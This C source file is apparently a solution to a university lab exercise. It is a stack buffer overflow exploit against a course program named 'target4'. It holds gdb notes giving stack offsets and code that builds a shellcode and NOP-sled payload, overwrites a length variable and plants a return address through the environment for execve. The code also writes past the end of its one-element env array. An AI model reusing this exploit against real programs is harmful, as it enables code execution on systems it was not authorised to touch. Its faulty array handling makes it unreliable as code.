#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

/*foo
(gdb) info frame
Stack level 0, frame at 0x2021fe70:
 rip = 0x400afa in foo (target4.c:14); saved rip 0x400bdd
 called by frame at 0x2021fe90
 source language c.
 Arglist at 0x2021fe60, args: arg=0x7fffffffe2bd "test"
 Locals at 0x2021fe60, Previous frame's sp is 0x2021fe70
 Saved registers:
  rbp at 0x2021fe60, rip at 0x2021fe68


*/


//buffer is at 0x2021fdb0
//len is at 0x2021fe58
//i is at 0x2021fe5c

//buf to len = 168 bytes
//buf to i = 172 bytes
//buf to return address = 184 bytes

int main(void)
{
  char *args[3];
  char *env[1];
	int i;
	unsigned char tmp[172];
	for (i=0; i<172; i++){
		tmp[i] = '\x00';
	}

	strcat(tmp, shellcode);
	
	for (i=45; i<168; i++){
		tmp[i]='\x90';
	}

	//overwrite len
	tmp[168]='\xff';
	tmp[169]='\xff';
	tmp[170]='\xff';
	tmp[171]='\x00';


  	args[0] = TARGET; 
  	args[1] = tmp; 
	args[2] = NULL;
  	env[0] = "\xf0\xff\xff\x00";
	env[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\xb0\xfd\x21\x20";

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
